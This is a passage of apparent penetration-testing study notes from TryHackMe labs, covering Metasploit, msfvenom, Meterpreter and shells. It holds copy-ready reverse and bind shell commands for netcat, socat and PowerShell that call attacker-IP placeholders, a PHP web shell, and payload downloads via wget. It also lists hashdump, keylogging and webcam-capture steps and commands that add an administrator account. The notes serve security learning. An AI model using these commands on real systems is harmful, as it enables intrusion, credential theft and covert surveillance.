  <li>Tools: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset.</li>
</ul>

<p><strong>components</strong></p>
<ul>
  <li>/opt/metasploit-framework-5101/modules/</li>
  <li>Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.</li>
  <li>Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.</li>
  <li>Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.</li>
  <li>Exploits: Exploits, neatly organized by target system.</li>
  <li>NOPs: NOPs (No OPeration) do nothing, literally.</li>
  <li>Payloads: Payloads are codes that will run on the target system. singles; stagers -&gt; stages.</li>
  <li>“generic/shell_reverse_tcp”, inline (or single) payload</li>
  <li>“windows/x64/shell/reverse_tcp”, staged payload</li>
  <li>Post: useful on the final stage of the penetration testing process listed above, post-exploitation.</li>
</ul>

<p><strong>msfconsole</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; help set</code></li>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; history</code></li>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</code></li>
  <li><code class="language-plaintext highlighter-rouge">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads</code>  payloads that can be used with the ms17-010 Eternalblue exploit.</li>
  <li><code class="language-plaintext highlighter-rouge">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; info</code> display detailed information</li>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; search ms17-010</code> searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.  <code class="language-plaintext highlighter-rouge">use 0</code> use the listed number.</li>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; search type:auxiliary telnet</code> search results to only include auxiliary module.</li>
  <li><code class="language-plaintext highlighter-rouge">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; unset all</code></li>
</ul>

<p><strong>Metasploit: Exploitation</strong>
TCP scan</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; search portscan</code></li>
  <li><code class="language-plaintext highlighter-rouge">msf6 auxiliary(scanner/portscan/tcp) &gt; show options</code></li>
</ul>

<p>UDP</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msf6 auxiliary(scanner/discovery/udp_sweep) &gt; run</code></li>
</ul>

<p>SMB Scans</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msf6 auxiliary(scanner/smb/smb_version) &gt; run</code></li>
</ul>

<p><strong>Metasploit Database</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">systemctl start postgresql</code></li>
  <li><code class="language-plaintext highlighter-rouge">msfdb init</code></li>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; db_status</code></li>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; workspace</code></li>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; workspace -a tryhackme</code> add; <code class="language-plaintext highlighter-rouge">-d</code> delete</li>
  <li><code class="language-plaintext highlighter-rouge">workspace -h</code></li>
</ul>

<p>db_nmap</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; db_nmap -sV -p- 10.10.12.229</code> run nmap, result saved to the database.</li>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; hosts</code>, <code class="language-plaintext highlighter-rouge">msf6 &gt; services</code> show saved information.</li>
  <li><code class="language-plaintext highlighter-rouge">hosts -h</code>, <code class="language-plaintext highlighter-rouge">services -h</code></li>
</ul>

<p>usage</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">use auxiliary/scanner/smb/smb_ms17_010</code></li>
  <li><code class="language-plaintext highlighter-rouge">hosts -R</code> add hosts value to the RHOSTS parameter</li>
  <li><code class="language-plaintext highlighter-rouge">msf6 &gt; services -S netbios</code> search “netbios” in services</li>
</ul>

<p>low-hanging fruits</p>
<ul>
  <li>HTTP, FTP, SMB, SSH, RDP</li>
</ul>

<p><strong>Exploitation</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads</code> list other commands you can use with that specific exploit.</li>
  <li><code class="language-plaintext highlighter-rouge">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 2</code></li>
  <li>background it using <code class="language-plaintext highlighter-rouge">CTRL+Z</code> or abort it using <code class="language-plaintext highlighter-rouge">CTRL+C</code></li>
  <li><code class="language-plaintext highlighter-rouge">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions</code> show sessions, include background.</li>
</ul>

<p><strong>Working with sessions</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -h</code> help</li>
  <li><code class="language-plaintext highlighter-rouge">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 1</code> interact with session 1.</li>
</ul>

<p>example</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nmap -sC -sV -p- -T4 --min-rate=9326 -vv [MACHINE IP]</code></li>
</ul>

<p><strong>Msfvenom</strong></p>
<ul>
  <li>Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).</li>
  <li><code class="language-plaintext highlighter-rouge"># msfvenom -l payloads</code></li>
  <li><code class="language-plaintext highlighter-rouge"># msfvenom --list formats</code></li>
</ul>

<p>encode</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge"># msfvenom -p php/meterpreter/reverse_tcp LHOST={IP} -f raw -e php/base64</code> The PHP version of Meterpreter was encoded in Base64, and the output format was raw.</li>
</ul>

<p><strong>Handlers</strong></p>
<ul>
  <li>The term commonly used to receive a connection from a target is ‘catching a shell’.</li>
  <li>Can be easily caught using a handler.</li>
  <li><code class="language-plaintext highlighter-rouge"># msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php</code></li>
  <li><code class="language-plaintext highlighter-rouge">use exploit/multi/handler</code> Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.</li>
</ul>

<p><strong>Other Payloads</strong></p>
<ul>
  <li>Linux Executable and Linkable Format (elf)</li>
  <li><code class="language-plaintext highlighter-rouge">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</code></li>
  <li><code class="language-plaintext highlighter-rouge">set payload linux/x86/meterpreter/reverse_tcp</code></li>
  <li>Windows</li>
  <li><code class="language-plaintext highlighter-rouge">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</code></li>
  <li>PHP</li>
  <li><code class="language-plaintext highlighter-rouge">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</code></li>
  <li>ASP</li>
  <li><code class="language-plaintext highlighter-rouge">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</code></li>
  <li>Python</li>
  <li><code class="language-plaintext highlighter-rouge">msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py</code></li>
</ul>

<p><strong>transfer</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">python3 -m http.server 9000</code></li>
  <li><code class="language-plaintext highlighter-rouge">wget http://ATTACKING_10.10.217.15:9000/shell.elf</code></li>
</ul>

<h2 id="meterpreter"><span class="mr-2">Meterpreter</span><a href="#meterpreter" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>runs in target memory and does not write itself to the disk on the target, avoid detecion</li>
  <li>Meterpreter will be seen as a process and not have a file on the target system.</li>
</ul>

<p>show different meterpreter version</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge"># msfvenom --list payloads | grep meterpreter</code></li>
</ul>

<p>How to choose version:</p>
<ul>
  <li>The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)</li>
  <li>Components available on the target system (Is Python installed? Is this a PHP website? etc.)</li>
  <li>Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)</li>
</ul>

<p><strong>Meterpreter Commands</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">help</code>
<strong>Core commands</strong></li>
  <li>background: Backgrounds the current session</li>
  <li>exit: Terminate the Meterpreter session</li>
  <li>guid: Get the session GUID (Globally Unique Identifier)</li>
  <li>help: Displays the help menu</li>
  <li>info: Displays information about a Post module</li>
  <li>irb: Opens an interactive Ruby shell on the current session</li>
  <li>load: Loads one or more Meterpreter extensions</li>
  <li>migrate: Allows you to migrate Meterpreter to another process</li>
  <li>run: Executes a Meterpreter script or Post module</li>
  <li>sessions: Quickly switch to another session</li>
</ul>

<p><strong>File system commands</strong></p>
<ul>
  <li>cd: Will change directory</li>
  <li>ls: Will list files in the current directory (dir will also work)</li>
  <li>pwd: Prints the current working directory</li>
  <li>edit: will allow you to edit a file</li>
  <li>cat: Will show the contents of a file to the screen</li>
  <li>rm: Will delete the specified file</li>
  <li>search: Will search for files</li>
  <li>upload: Will upload a file or directory</li>
  <li>download: Will download a file or directory</li>
</ul>

<p><strong>Networking commands</strong></p>
<ul>
  <li>arp: Displays the host ARP (Address Resolution Protocol) cache</li>
  <li>ifconfig: Displays network interfaces available on the target system</li>
  <li>netstat: Displays the network connections</li>
  <li>portfwd: Forwards a local port to a remote service</li>
  <li>route: Allows you to view and modify the routing table</li>
</ul>

<p><strong>System commands</strong></p>
<ul>
  <li>clearev: Clears the event logs</li>
  <li>execute: Executes a command</li>
  <li>getpid: Shows the current process identifier</li>
  <li>getuid: Shows the user that Meterpreter is running as</li>
  <li>kill: Terminates a process</li>
  <li>pkill: Terminates processes by name</li>
  <li>ps: Lists running processes</li>
  <li>reboot: Reboots the remote computer</li>
  <li>shell: Drops into a system command shell</li>
  <li>shutdown: Shuts down the remote computer</li>
  <li>sysinfo: Gets information about the remote system, such as OS</li>
</ul>

<p><strong>Others Commands</strong> (these will be listed under different menu categories in the help menu)</p>
<ul>
  <li>idletime: Returns the number of seconds the remote user has been idle</li>
  <li>keyscan_dump: Dumps the keystroke buffer</li>
  <li>keyscan_start: Starts capturing keystrokes</li>
  <li>keyscan_stop: Stops capturing keystrokes</li>
  <li>screenshare: Allows you to watch the remote user’s desktop in real time</li>
  <li>screenshot: Grabs a screenshot of the interactive desktop</li>
  <li>record_mic: Records audio from the default microphone for X seconds</li>
  <li>webcam_chat: Starts a video chat</li>
  <li>webcam_list: Lists webcams</li>
  <li>webcam_snap: Takes a snapshot from the specified webcam</li>
  <li>webcam_stream: Plays a video stream from the specified webcam</li>
  <li>getsystem: Attempts to elevate your privilege to that of local system</li>
  <li>hashdump: Dumps the contents of the SAM database</li>
</ul>

<p><strong>Post-Exploitation with Meterpreter</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">getuid</code></li>
  <li><code class="language-plaintext highlighter-rouge">ps</code></li>
  <li><code class="language-plaintext highlighter-rouge">migrate 716</code> Meterpreter migrating to process ID 716.</li>
  <li><code class="language-plaintext highlighter-rouge">hashdump</code>  list the content of the SAM database, SAM (Security Account Manager),</li>
  <li><code class="language-plaintext highlighter-rouge">search -f flag2.txt</code> quickly find a flag or proof file</li>
  <li><code class="language-plaintext highlighter-rouge">shell</code></li>
  <li><code class="language-plaintext highlighter-rouge">getsystem</code></li>
  <li><code class="language-plaintext highlighter-rouge">load python</code></li>
  <li><code class="language-plaintext highlighter-rouge">load kiwi</code></li>
</ul>

<p><strong>usage on a WINDOWS machine</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">set payload windows/meterpreter/reverse_tcp</code></li>
  <li><code class="language-plaintext highlighter-rouge">sysinfo</code></li>
  <li><code class="language-plaintext highlighter-rouge">hashdump</code></li>
  <li><code class="language-plaintext highlighter-rouge">post/windows/gather/enum_domain</code></li>
  <li><code class="language-plaintext highlighter-rouge">post/windows/gather/enum_shares</code></li>
  <li><code class="language-plaintext highlighter-rouge">post/windows/manage/migrate</code></li>
  <li>NTLM hash, the second hash after command hashdump, what is the first.</li>
  <li><code class="language-plaintext highlighter-rouge">meterpreter &gt; search -f secrets.txt</code></li>
  <li><code class="language-plaintext highlighter-rouge">meterpreter &gt; cat "{file_path}"</code></li>
</ul>

<h2 id="shell"><span class="mr-2">Shell</span><a href="#shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p><strong>tool: set up listener</strong></p>
<ul>
  <li>Netcat, Socat, Metasploit – multi/handler,</li>
  <li>PayloadsAllTheThings. Reverse Shell Cheat Sheet https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</li>
  <li>pentestmonkey. Reverse Shell Cheat Sheet. https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</li>
  <li>SecLists https://github.com/danielmiessler/SecLists</li>
</ul>

<p><strong>Types of Shell</strong>
Reverse shell.</p>
<ul>
  <li>attacker listen.</li>
  <li>Reverse shells. need to configure your own network to accept the shell.</li>
  <li>attack: <code class="language-plaintext highlighter-rouge">sudo nc -lvnp 443</code></li>
  <li>target: <code class="language-plaintext highlighter-rouge">nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; -e /bin/bash</code></li>
</ul>

<p>Bind shell.</p>
<ul>
  <li>target listen.</li>
  <li>Bind shells. start a listener attached to a shell directly on the target.may be prevented by firewalls protecting the target.</li>
  <li>target: <code class="language-plaintext highlighter-rouge">nc -lvnp &lt;port&gt; -e "cmd.exe"</code></li>
  <li>attacker: <code class="language-plaintext highlighter-rouge">nc &lt;TARGET_IP&gt; &lt;port&gt;</code></li>
</ul>

<p><strong>interactive or non-interactive</strong></p>
<ul>
  <li>interactive: allow you to interact with programs after executing them.</li>
  <li>Non-Interactive:</li>
</ul>

<p><strong>Netcat</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nc -lvnp &lt;port-number&gt;</code> start listener of reverse shell</li>
  <li><code class="language-plaintext highlighter-rouge">nc &lt;target-ip&gt; &lt;chosen-port&gt;</code> obtain bind shell</li>
</ul>

<p><strong>Netcat Shell Stabilisation</strong>
Technique 1: Python</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash")'</code> spawn a better featured bash shell</li>
  <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code> able to use commands like <code class="language-plaintext highlighter-rouge">clear</code></li>
  <li><code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code></li>
  <li><img data-src="https://user-images.githubusercontent.com/91292763/148204472-f50d32d6-1821-404e-8da6-beaede32a2d4.png" alt="image" data-proofer-ignore></li>
</ul>

<p>Technique 2: rlwrap</p>
<ul>
  <li>gives us access to history, tab autocompletion and the arrow keys</li>
  <li><code class="language-plaintext highlighter-rouge">sudo apt install rlwrap</code></li>
  <li><code class="language-plaintext highlighter-rouge">rlwrap nc -lvnp &lt;port&gt;</code> start listener</li>
  <li><code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code></li>
</ul>

<p>Technique 3: Socat</p>
<ul>
  <li>socat static compiled binary (a version of the program compiled to have no dependencies)</li>
  <li><code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code></li>
  <li><code class="language-plaintext highlighter-rouge">wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code></li>
  <li><code class="language-plaintext highlighter-rouge">Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</code></li>
</ul>

<p>change your terminal tty size:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">stty -a</code></li>
  <li><code class="language-plaintext highlighter-rouge">stty rows &lt;number&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">stty cols &lt;number&gt;</code></li>
</ul>

<p><strong>Socat</strong>
Reverse Shells</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">socat TCP-L:&lt;port&gt; -</code> linux or windows</li>
  <li><code class="language-plaintext highlighter-rouge">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;</code> <code class="language-plaintext highlighter-rouge">EXEC:powershell.exe,pipes</code> Windows</li>
  <li><code class="language-plaintext highlighter-rouge">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:"bash -li"</code> Linux</li>
</ul>

<p>Bind Shells</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">socat TCP-L:&lt;PORT&gt; EXEC:"bash -li"</code> Linux</li>
  <li><code class="language-plaintext highlighter-rouge">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</code> Windows</li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code> linux or windows</p>
  </li>
  <li><code class="language-plaintext highlighter-rouge">socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</code> listener</li>
  <li><code class="language-plaintext highlighter-rouge">socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code></li>
</ul>

<p><strong>Socat Encrypted Shells</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code> Generate a certificate. creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.</li>
  <li><code class="language-plaintext highlighter-rouge">cat shell.key shell.crt &gt; shell.pem</code> merge two into a single file</li>
</ul>

<p>reverse shell</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0</code> setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called “encrypt.pem”.</li>
  <li><code class="language-plaintext highlighter-rouge">verify=0</code> tells the connection to not bother trying to validate.</li>
  <li>certificate must be used on whichever device is listening.</li>
  <li><code class="language-plaintext highlighter-rouge">socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</code> connect back</li>
  <li><code class="language-plaintext highlighter-rouge">socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code> your IP is 10.10.10.5, the syntax to connect back to this listener.</li>
  <li><img data-src="https://user-images.githubusercontent.com/91292763/148321654-ead239c7-fddb-4667-9b3b-236cdddd2ed5.png" alt="image" data-proofer-ignore></li>
</ul>

<p>Bind shell</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</code> target.</li>
  <li><code class="language-plaintext highlighter-rouge">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</code> attacker.</li>
</ul>

<p><strong>Common Shell Payloads</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nc -lvnp &lt;PORT&gt; -e /bin/bash</code> bind shell on the target</li>
  <li><code class="language-plaintext highlighter-rouge">nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code> reverse shell, connect back</li>
</ul>

<p>create a listener for a bind shell:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code></li>
  <li>creates a named pipe at /tmp/f</li>
  <li>connects the input of the listener to the output of the named pipe.</li>
  <li>output of the netcat listener (i.e. the commands we send) then gets piped directly into sh.</li>
  <li><img data-src="https://user-images.githubusercontent.com/91292763/148352081-fc3d5f98-82f0-45be-ae98-57bbc046373b.png" alt="image" data-proofer-ignore></li>
</ul>

<p>nc reverse shell:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code></li>
  <li><img data-src="https://user-images.githubusercontent.com/91292763/148352066-1f3bf559-2062-4933-b9f0-84ce613499c1.png" alt="image" data-proofer-ignore></li>
</ul>

<p>reverse power shell on Windows:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">powershell -c "$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></li>
</ul>

<p><strong>Other reverse shell:</strong></p>
<ul>
  <li>PayloadsAllTheThings</li>
  <li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</li>
</ul>

<p><strong>msfvenom</strong>
standard</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code></li>
</ul>

<p>Windows x64 Reverse Shell</p>
<ul>
  <li>```` msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port> ```</listen-port></listen-IP></li>
  <li>-f: format</li>
  <li>-o: output</li>
</ul>

<p>staged meterpreter reverse shell for a 64bit Linux target</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443</code></li>
</ul>

<p>Payload Naming Conventions</p>
<ul>
  <li>OS/arch/payload</li>
  <li>eg. linux/x86/shell_reverse_tcp</li>
  <li>eg. <code class="language-plaintext highlighter-rouge">windows/x64/meterpreter/reverse_tcp</code> staged payload</li>
  <li>eg. <code class="language-plaintext highlighter-rouge">linux/x86/meterpreter_reverse_tcp</code> stageless payload</li>
</ul>

<p>list payloads:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">msfvenom --list payloads | grep "linux/x86/meterpreter"</code></li>
</ul>

<p><strong>Metasploit multi/handler</strong></p>
<ul>
  <li>3 options:  payload, LHOST and LPORT.</li>
  <li><code class="language-plaintext highlighter-rouge">exploit -j</code> run in background.</li>
</ul>

<p><strong>WebShells</strong>
php</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code></li>
  <li>usage. input in URL “10.10.84.199/uploads/shell.php?cmd=ifconfig”</li>
  <li>run <code class="language-plaintext highlighter-rouge">ifconfig</code> on server.</li>
</ul>

<p>pentestmonkey reverse shell</p>
<ul>
  <li>https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</li>
  <li>a full reverse shell written in PHP</li>
</ul>

<p><strong>Next</strong>
Try to get access to user account</p>
<ul>
  <li>SSH keys stored at <code class="language-plaintext highlighter-rouge">/home/&lt;user&gt;/.ssh</code></li>
  <li>Windows eg, VNC servers frequently leave passwords in the registry stored in plaintext.</li>
  <li>FileZilla FTP server also leave credentials in an XML file</li>
</ul>

<p>windos add user:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">net user &lt;username&gt; &lt;password&gt; /add</code></li>
  <li><code class="language-plaintext highlighter-rouge">net localgroup administrators &lt;username&gt; /add</code></li>
</ul>

<p><strong>practice</strong>
p1</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nc -lnvp 4444</code> on attacker.</li>
  <li><code class="language-plaintext highlighter-rouge">NC &lt;yourmachineip&gt; -e /bin.bash</code> on target.</li>
  <li><code class="language-plaintext highlighter-rouge">python3 -c 'import pty;pty.spawn("/bin/bash")'</code> on attacker, stabilize</li>
</ul>

<p>p2</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/usr/share/webshells/php/php-reverse-shell.php</code> change the IP to attacker`s.</li>
  <li><code class="language-plaintext highlighter-rouge">nc -lnvp 1234</code> on attacker.</li>
  <li>upload <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code> to server and run it.</li>
</ul>

<p>p3(nc REVERSE SHELL)</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code> attacker’s</li>
  <li><code class="language-plaintext highlighter-rouge">nc &lt;tun0-ip&gt; 4444-e /bin/bash</code> target’s</li>
</ul>

<p>p3(nc BIND SHELL)</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nc  -lvnp 4444-e /bin/bash</code> target’s terminal</li>
  <li><code class="language-plaintext highlighter-rouge">nc &lt;target-ip&gt; 4444</code> attacker’s terminal</li>
</ul>

<p>p4(socat reverse shell linux)</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">socat TCP-L:4444 -</code> attacker`s</li>
  <li><code class="language-plaintext highlighter-rouge">socat TCP:&lt;tun0-ip&gt;:4444 EXEC:"bash -li"</code> target`s</li>
</ul>

<p>p4(socat bind shell linux)</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">socat TCP-L:4444 EXEC:"bash -li"</code> target`s</li>
  <li><code class="language-plaintext highlighter-rouge">socat TCP:&lt;ip&gt;:4444 -</code> attacker`s</li>
</ul>

<p>P5 other reverse shell techniques</p>
<ul>
  <li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</li>
</ul>

<p>p6</p>
<ul>
  <li>can not submit linux reverse shell to windows</li>
</ul>

<p>p7 windows php reverse shell</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge"> &lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code></li>
</ul>

<p>P8 Windows net command.</p>
<ul>
  <li>The “Net Accounts” command is used to set the policy settings on local computer, such as Account policies and password policies. This command can’t be used on domain controller. This command is only used on local computer.</li>
  <li>add a user and add to administrators group.</li>
  <li><code class="language-plaintext highlighter-rouge">net user USERNAME PASSWORD /ad</code></li>
  <li><code class="language-plaintext highlighter-rouge">net localgroup administrators USERNAME /add</code></li>
</ul>

<p>p9 (nc reverse shell windows)</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code> attacker`s</li>
  <li><code class="language-plaintext highlighter-rouge">nc &lt;tun0-ip&gt; 4444 -e "cmd.exe"</code> target`s</li>
</ul>

<p>p9 (nc bind shell windows)</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nc -lvnp 3333 -e "cmd.exe"</code> target`s</li>
  <li><code class="language-plaintext highlighter-rouge">nc &lt;target-ip&gt;  3333</code> attacker`s</li>
</ul>

<p>p9 (socat reverse shell windows)</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">socat TCP-L:8888 -</code> attacker`s</li>
  <li><code class="language-plaintext highlighter-rouge">socat TCP:&lt;tun0-ip&gt;:8888 EXEC:powershell.exe,pipes</code> target`s</li>
</ul>

<p>p9 (socat bind shell windows)</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">socat TCP-L:4444EXEC:powershell.exe,pipes</code> target`s</li>
  <li><code class="language-plaintext highlighter-rouge">socat TCP:&lt;target-ip&gt;:4444-</code> attacker`s</li>
</ul>

<p>p10 Create a 64bit Windows Meterpreter shell using msfvenom</p>
<ul>
  <li>create shell</li>
  <li><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=&lt;tun0-ip&gt; LPORT=4444</code></li>
  <li>start a listener</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>msfconsole
use multi/handler
set LHOST=&lt;tun0-ip&gt; ,
set LPORT=4444
set payload windows/x64/meterpreter/reverse_tcp
run 
</pre></td></tr></tbody></table></code></div></div>

<h2 id="linux-privesc"><span class="mr-2">Linux PrivEsc</span><a href="#linux-privesc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p><strong>Enumeration</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">$ hostname</code> hostname</li>
  <li><code class="language-plaintext highlighter-rouge">$ uname -a</code></li>
  <li><code class="language-plaintext highlighter-rouge">$ cat /proc/version</code> kernel version</li>
  <li><code class="language-plaintext highlighter-rouge">$ cat /etc/os-release</code> system version</li>
  <li><code class="language-plaintext highlighter-rouge">$ cat /etc/issue</code> system version</li>
  <li><code class="language-plaintext highlighter-rouge">ps -A</code>  View all running processes</li>
  <li><code class="language-plaintext highlighter-rouge">ps axjf</code> View process tree</li>
  <li><code class="language-plaintext highlighter-rouge">ps aux</code> show processes for all users (a), display the user that launched the process (u),  processes that are not attached to a terminal (x)</li>
